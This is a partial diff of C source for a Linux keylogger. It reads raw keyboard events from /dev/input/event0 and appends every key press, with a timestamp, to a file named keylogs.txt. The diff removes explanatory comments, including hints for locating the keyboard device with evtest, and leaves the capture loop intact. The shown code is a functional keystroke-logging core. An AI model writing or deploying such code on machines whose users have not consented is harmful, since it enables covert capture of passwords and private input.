@@ -10,10 +10,8 @@
 #include "keycode.h"
 
     int main (){
-	//might not be the same for all linux machines 
-	//you can check what is  you keyboard device by :
 	//ls /dev/input
-	//sudo evtest /dev/input/event*  # Replace * with the event numbers from before
+	//sudo evtest /dev/input/event* 
 	const char *kyb_device = "/dev/input/event0";
     	const char *output_file = "keylogs.txt";
 
@@ -38,16 +36,11 @@
     while (1) {
         int Bytes_Read_Count = read(fd, &ev, sizeof(struct input_event));
         if (Bytes_Read_Count == sizeof(struct input_event)) {
-            if (ev.type == EV_KEY && ev.value == 1) { // Key press event
-                // Get the current time
+            if (ev.type == EV_KEY && ev.value == 1) {
                 time(&rawtime);
                 timeinfo = localtime(&rawtime);
                 strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", timeinfo);
 
-                // uncomment to Print to console
-               // printf("Key %i (%s) pressed at %s\n", ev.code, keycode_to_string(ev.code), buffer);
-
-                // Write to log file
                 fprintf(output, "%s        pressed at :  %s\n", keycode_to_string(ev.code), buffer);
                 fflush(output);
             }
